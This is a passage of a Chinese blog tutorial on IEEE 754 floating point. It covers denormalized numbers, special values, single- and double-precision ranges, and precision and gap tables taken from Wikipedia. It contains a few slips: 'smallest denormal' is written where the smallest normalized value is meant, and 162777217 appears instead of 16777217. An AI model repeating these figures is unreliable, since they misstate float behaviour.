<p><strong>非规约形式浮点数</strong>的<strong>阶码</strong>为 $0$，并且<strong>尾码</strong>为非 $0$。相比规约形式浮点数其最大的不同之处在于，<strong>其尾码隐含的整数部分不再是 $1$，而变成了 $0$</strong>。另外，IEEE 754 标准规定，<strong>非规约形式的浮点数的指数偏移值比规约形式的浮点数的指数偏移值小 $1$</strong>。也就是说，最小的规约形式浮点数阶码为 $1$，指数的实际值为 $-126$。而非规约形式的单精度浮点数的阶码为 $0$，依照上述规定其指数的实际值也是 $-126$ 而不是 $-127$。</p>
<h4 id="为什么要这样规定">为什么要这样规定？</h4>
<p>我们首先来看看这种规定下<strong>非规约形式</strong>浮点数能表示的<strong>最大</strong>正浮点数吧（拿<strong>单精度</strong>举个例子，双精度是类似的）：</p>
<table>
<thead>
<tr>
<th>符号位</th>
<th>阶码</th>
<th>尾码</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0000 0000</td>
<td>111 1111 1111 1111 1111 1111</td>
</tr>
</tbody>
</table>
<p>不难得出，其实际指数 $E = 0 - 126 = -126$，其实际有效数字为 ${0.11111111111111111111111}_2$。因此，二进制下，其表示的实际值为 $V = {0.11111111111111111111111}_2 \times 2^{-126}$。</p>
<p>而对于<strong>规约形式浮点数</strong>能表示的<strong>最小</strong>正浮点数：</p>
<table>
<thead>
<tr>
<th>符号位</th>
<th>阶码</th>
<th>尾码</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0000 0001</td>
<td>000 0000 0000 0000 0000 0000</td>
</tr>
</tbody>
</table>
<p>不难得出，其实际指数为 $E = 1 - 127 = -126$，其实际有效数字为 ${1.00000000000000000000000}_2$。因此，二进制下，其表示的实际值为 $V = {1.00000000000000000000000}_2 \times 2^{-126}$。</p>
<p>不难发现在这种规定下，<strong>最大非规约形式浮点数和最小非规约形式浮点数是连续的</strong>。这也是该规定出现的原因。</p>
<h2 id="特殊值">特殊值</h2>
<p>另外，在标准中也定义了几个特殊值：</p>
<ul>
<li>当<strong>阶码</strong>和<strong>尾码</strong>均为 $0$ 时，浮点数表示的实际值为 $\pm 0$；</li>
<li>当<strong>阶码</strong>为 $2^{e} - 1$且<strong>尾码</strong>为 0 时，浮点数表示的实际值为 $\pm \infty$；</li>
<li>当<strong>阶码</strong>为 $2^e - 1$ 且<strong>尾码</strong>非 0 时，浮点数表示的实际值为 $\text{NaN}$ <em>(Not a Number)</em>。</li>
</ul>
<p>$\text{NaN}$ 是什么？可以吃吗？</p>
<p>当然不能。$\text{NaN}$ 往往出现于一些无效的计算结果。比如说，对负数进行求平方根运算，返回的结果就是 $\text{NaN}$。</p>
<h2 id="取值范围精度和间隙">取值范围、精度和间隙</h2>
<p>注：本节主要讨论单精度浮点数的取值范围与精度。双精度与之类似，所以请读者自行推导。</p>
<h3 id="取值范围-range">取值范围 (Range)</h3>
<p>前文中已经介绍过单精度浮点数在存储中的大致结构了。我们先就<strong>正浮点数</strong>做一下分析：</p>
<h4 id="非规约形式单精度浮点数能表示的最小正值">非规约形式单精度浮点数能表示的最小正值</h4>
<table>
<thead>
<tr>
<th>符号位</th>
<th>阶码</th>
<th>尾码</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0000 0000</td>
<td>000 0000 0000 0000 0000 0001</td>
</tr>
</tbody>
</table>
<p>不难得出，不难得出，其实际指数 $E$ = 0 - 126 = -126，其实际有效数字为 ${0.00000000000000000000001}_2$。因此，二进制下，其表示的实际值为 $V = {0.00000000000000000000001}_2 \times 2^{-126} \approx 1.40130 \times 10^{-45}$。</p>
<h4 id="规约形式单精度浮点数能表示的最小正值">规约形式单精度浮点数能表示的最小正值</h4>
<table>
<thead>
<tr>
<th>符号位</th>
<th>阶码</th>
<th>尾码</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0000 0001</td>
<td>000 0000 0000 0000 0000 0000</td>
</tr>
</tbody>
</table>
<p>不难得出，其实际指数为 $E$ = 1 - 127 = -126，其实际有效数字为 ${1.00000000000000000000000}_2$。因此，二进制下，其表示的实际值为 $V = {1.00000000000000000000000}_2 \times 2^{-126} \approx 1.17549 \times 10^{-38}$。</p>
<h5 id="单精度浮点数能表示的最大正值">单精度浮点数能表示的最大正值</h5>
<table>
<thead>
<tr>
<th>符号位</th>
<th>阶码</th>
<th>尾码</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>1111 1110</td>
<td>111 1111 1111 1111 1111 1111</td>
</tr>
</tbody>
</table>
<p>不难得出，不难得出，其实际指数 $E$ = 254 - 127 = 127，其实际有效数字为 ${1.11111111111111111111111}_2$。因此，二进制下，其表示的实际值为 $V = {1.11111111111111111111111}_2 \times 2^{127} \approx 3.40282 \times 10^{38}$。</p>
<p>对于负数也是一样的，这里也不做过多讨论。</p>
<p>双精度也是与此类似的，这里只给出如下结论：</p>
<h5 id="非规约形式双精度浮点数能表示的最小正值">非规约形式双精度浮点数能表示的最小正值</h5>
<p>$2^{-1074} \approx 4.94066 \times 10^{-324}$</p>
<h5 id="规约形式双精度浮点数能表示的最小正值">规约形式双精度浮点数能表示的最小正值</h5>
<p>$2^{-1022} \approx 2.22507 \times 10^{-308}$</p>
<h5 id="双精度浮点数能表示的最大正值">双精度浮点数能表示的最大正值</h5>
<p>$(1 - 2^{-53}) \times 2^{1024} \approx 1.79769 \times 10^{308}$</p>
<h3 id="精度-precision-与-间隙-gap">精度 (Precision) 与 间隙 (Gap)</h3>
<p>首先摘抄一段来自 <a href="https://en.wikipedia.org/wiki/IEEE_754-1985#Range_and_precision">Wikipedia</a> 的原文：</p>
<blockquote>
<p><strong>Precision</strong> is defined as the minimum difference between two successive mantissa representations; thus it is a function only in the mantissa; while the <strong>gap</strong> is defined as the difference between two successive numbers.</p>
</blockquote>
<p>简单翻译过来就是（不知道翻译错没有）：</p>
<p><strong>精度</strong>的定义为两个连续尾数表示之间的最小差值，因此它只是存在于尾数中的功能。而<strong>间隙</strong>被定义为两个连续数字之间的差值。</p>
<p>对于<strong>精度</strong>，我们已经可以很容易地回答这个问题了。对于单精度浮点数，尾码有 $23$ 位。$2^{23} = 8388608$，因此<strong>单精度浮点数最长（不完整地）可存储小数点后 $7$ 位，但只能完整地存储小数点后 $6$ 位</strong>。</p>
<p>而对于<strong>间隙</strong>出现的原因，我们可以这样理解。</p>
<p>前面我们提到了浮点数内部存储实际上是二进制科学记数法，我们不难发现尾数是有限位的。当指数越来越大时，相邻两尾数表示的两实际值之间的大小也越来越大。这两实际值之间的差也就是<strong>间隙</strong>。而在间隙之间的数是无法被准确存储下来的。</p>
<p>我们不妨从 <a href="https://en.wikipedia.org/wiki/IEEE_754-1985#Single_precision">Wikipedia</a> 摘录一个展示单精度类型在不同指数下相邻两实际值之间的间隙大小的表格。其中最小值和最大值分别代表当实际指数一定时该浮点数可表示的最小十进制数和最大十进制数。</p>
<table>
<thead>
<tr>
<th><strong>实际指数</strong></th>
<th><strong>阶码</strong></th>
<th><strong>最小值</strong></th>
<th><strong>最大值</strong></th>
<th><strong>间隙</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>127</td>
<td>1</td>
<td>≈ 1.999999880791</td>
<td>≈ 1.19209e-7</td>
</tr>
<tr>
<td>1</td>
<td>128</td>
<td>2</td>
<td>≈ 3.999999761581</td>
<td>≈ 2.38419e-7</td>
</tr>
<tr>
<td>2</td>
<td>129</td>
<td>4</td>
<td>≈ 7.999999523163</td>
<td>≈ 4.76837e-7</td>
</tr>
<tr>
<td>10</td>
<td>137</td>
<td>1024</td>
<td>≈ 2047.999877930</td>
<td>≈ 1.22070e-4</td>
</tr>
<tr>
<td>11</td>
<td>138</td>
<td>2048</td>
<td>≈ 4095.999755859</td>
<td>≈ 2.44141e-4</td>
</tr>
<tr>
<td>23</td>
<td>150</td>
<td>8388608</td>
<td>16777215</td>
<td>1</td>
</tr>
<tr>
<td>24</td>
<td>151</td>
<td>16777216</td>
<td>33554430</td>
<td>2</td>
</tr>
<tr>
<td>127</td>
<td>254</td>
<td>≈ 1.70141e38</td>
<td>≈ 3.40282e38</td>
<td>≈ 2.02824e31</td>
</tr>
</tbody>
</table>
<p>根据表格，当实际指数为 24 时，相邻两数间的差值已经达到了 2 这么大。因此，$162777217$ 实际上是无法用浮点数表示的，因为事实上它的值会丢失精度至 $162777216$。</p>
<p>相比单精度，由于双精度的尾数总位数更长，故在指数相同时，双精度数与数之间的间隙会比单精度数更小。下面我们也继续从 <a href="https://en.wikipedia.org/wiki/IEEE_754-1985#Double_precision">Wikipedia</a> 摘录一个展示双精度类型不同指数下相邻两实际值间间隙的表格：</p>
<table>
<thead>
<tr>
<th><strong>实际指数</strong></th>
<th><strong>阶码</strong></th>
<th><strong>最小值</strong></th>
<th><strong>最大值</strong></th>
<th><strong>间隙</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>1023</td>
<td>1</td>
<td>≈ 1.999999999999999777955</td>
<td>≈ 2.22045e-16</td>
</tr>
<tr>
<td>1</td>
<td>1024</td>
<td>2</td>
<td>≈ 3.999999999999999555911</td>
<td>≈ 4.44089e-16</td>
</tr>
<tr>
<td>2</td>
<td>1025</td>
<td>4</td>
<td>≈ 7.999999999999999111822</td>
<td>≈ 8.88178e-16</td>
</tr>
<tr>
<td>10</td>
<td>1033</td>
<td>1024</td>
<td>≈ 2047.999999999999772626</td>
<td>≈ 2.27374e-13</td>
</tr>
<tr>
<td>11</td>
<td>1034</td>
<td>2048</td>
<td>≈ 4095.999999999999545253</td>
<td>≈ 4.54747e-13</td>
</tr>
<tr>
<td>52</td>
<td>1075</td>
<td>4503599627370496</td>
<td>9007199254740991</td>
<td>1</td>
</tr>
<tr>
<td>53</td>
<td>1076</td>
<td>9007199254740992</td>
<td>18014398509481982</td>
<td>2</td>
</tr>
<tr>
<td>1023</td>
<td>2046</td>
<td>≈ 8.98847e307</td>
<td>≈ 1.79769e308</td>
<td>≈ 1.99584e292</td>
</tr>
</tbody>
</table>
<p>这也完美地解释了前几天在学校的 OJ 上水题有的题明明在单精度取值范围内却没法用单精度 A 掉的原因…… 看起来还是我太弱了 orz。</p>
<h1 id="小结">小结</h1>
<p>懒得写了（逃</p>
<h1 id="参考文献">参考文献</h1>
<p>排序顺序嘛…… 我才不会告诉你是乱序呢。</p>
<ul>
<li>红太阳 <a href="http://fstqwq.pw">fstqwq</a> %%%</li>
<li>维基百科 - <a href="https://zh.wikipedia.org/zh-cn/%E4%BA%8C%E8%A3%9C%E6%95%B8">补码</a></li>
<li>维基百科 - <a href="https://zh.wikipedia.org/wiki/IEEE_754">IEEE 754</a></li>
<li>Wikipedia - <a href="https://en.wikipedia.org/wiki/IEEE_754-1985">IEEE 754-1985</a></li>
<li>adream307 - <a href="http://blog.csdn.net/adream307/article/details/7246993">float 的内存结构</a></li>
<li>andyhzw - <a href="http://blog.chinaunix.net/uid-28458801-id-3507427.html">C/C++ 中浮点数的存储方式</a></li>
<li>wenrang - <a href="http://blog.csdn.net/wenrang/article/details/5758759">浮点数与 IEEE 浮点标准</a></li>
</ul>
]]></content>
		</item>
		
	</channel>
</rss>
